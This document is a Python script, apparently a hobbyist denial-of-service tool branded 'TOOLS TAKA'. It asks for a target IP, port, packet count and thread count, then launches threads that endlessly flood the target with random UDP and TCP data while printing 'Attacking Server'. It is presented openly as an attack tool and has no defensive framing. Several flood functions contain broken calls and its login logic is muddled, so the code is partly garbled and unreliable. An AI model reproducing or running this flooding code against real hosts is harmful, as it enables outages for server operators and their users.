import random
import socket
import threading
import time
import os,sys
import random, socket, threading

username=('Takaa')
password=('123')
UserWarning= "Your Password lose!"
usernameget=input('Username:')
passwordget=input('Password: ')
print("Login Berhasil GAS")

print("""
\033[0;36m                 ██████ ▓██   ██▓ ███▄    █ ▄▄▄█████▓ ▄▄▄     ▒██   ██▒
\033[0;36m               ▒██    ▒  ▒██  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▒████▄   ▒▒ █ █ ▒░
\033[0;36m               ░ ▓██▄     ▒██ ██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒██  ▀█▄ ░░  █   ░
\033[0;36m                 ▒   ██▒  ░ ▐██▓░▓██▒  ▐▌██▒░ ▓██▓ ░ ░██▄▄▄▄██ ░ █ █ ▒ 
\033[0;36m               ▒██████▒▒  ░ ██▒▓░▒██░   ▓██░  ▒██▒ ░  ▓█   ▓██▒██▒ ▒██▒
\033[0;36m               ▒ ▒▓▒ ▒ ░   ██▒▒▒ ░ ▒░   ▒ ▒   ▒ ░░    ▒▒   ▓▒█▒▒ ░ ░▓ ░
\033[0;36m               ░ ░▒  ░   ▓██ ░▒░ ░ ░░   ░ ▒░    ░      ░   ▒▒ ░░   ░▒ ░
\033[0;36m               ░  ░  ░   ▒ ▒ ░░     ░   ░ ░   ░ ░      ░   ▒   ░    ░  
\033[0;36m                     ░   ░ ░              ░                ░   ░    ░ 
TOOLS TAKA""")
print("\033[31m━━━ Gas brother Y in (y/n)")
choice = str(input("┗━>\033[0m:"))
print("[0] Loading.......")
time.sleep(1)
print("[25] Loading......")
time.sleep(1)
print("[69] Loading.......")
time.sleep(1)
print("[100] Loading.......")
time.sleep(1)
print("""
\033[0;31m                 ██████ ▓██   ██▓ ███▄    █ ▄▄▄█████▓ ▄▄▄     ▒██   ██▒
\033[0;32m               ▒██    ▒  ▒██  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▒████▄   ▒▒ █ █ ▒░
\033[0;33m               ░ ▓██▄     ▒██ ██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒██  ▀█▄ ░░  █   ░
\033[0;34m                 ▒   ██▒  ░ ▐██▓░▓██▒  ▐▌██▒░ ▓██▓ ░ ░██▄▄▄▄██ ░ █ █ ▒ 
\033[0;35m               ▒██████▒▒  ░ ██▒▓░▒██░   ▓██░  ▒██▒ ░  ▓█   ▓██▒██▒ ▒██▒
\033[0;36m               ▒ ▒▓▒ ▒ ░   ██▒▒▒ ░ ▒░   ▒ ▒   ▒ ░░    ▒▒   ▓▒█▒▒ ░ ░▓ ░
\033[0;37m               ░ ░▒  ░   ▓██ ░▒░ ░ ░░   ░ ▒░    ░      ░   ▒▒ ░░   ░▒ ░
\033[0;38m               ░  ░  ░   ▒ ▒ ░░     ░   ░ ░   ░ ░      ░   ▒   ░    ░  
\033[0;39m                     ░   ░ ░              ░                ░   ░    ░ 
""")
time.sleep(1)
print("\033[31m━━━ Host/IP")
ip = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Port")
port = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Packets")	
times = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Threads")
threads = int(input("┗━>\033[0m:"))
def xxxxxxxxx():
  data = random._urandom(881)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(data,addr)
        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack By Takaa")

def xxxxxxxx():
  data = random._urandom(881)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(data,addr)
        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack By Takaa")

def xxxxxxx():
  data = random._urandom(881)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.send(data,addr)
        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack By Takaa")

def xxxxxx():
  data = random._urandom(881)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(data,addr)
        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack By Takaa")

def xxxxx():
  data = random._urandom(881)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \032m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack By Takaa")

def xxxx():
  data = random._urandom(881)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack By Takaa")

def xxx():
  data = random._urandom(991)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(data,addr)
        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack By Takaa")

def xx():
  data = random._urandom(991)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack By Takaa")

def x():
  data = random._urandom(991)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack By Takaa")

for y in range(threads):
  if usernameget==username:
      if passwordget==password:
          print('Succesfully')
      else:
          print('Password is Wrong')
  else:
    print('Username is Wrong')
    print('Username is Wrong')
    th = threading.Thread(target = xxxxxxxxx)
    th.start()
    th = threading.Thread(target = xxxxxxxx)
    th.start()
    th = threading.Thread(target = xxxxxxx)
    th.start()
    th = threading.Thread(target = xxxxxx)
    th.start()
    th = threading.Thread(target = xxxxx)
    th.start()
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()
else:
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()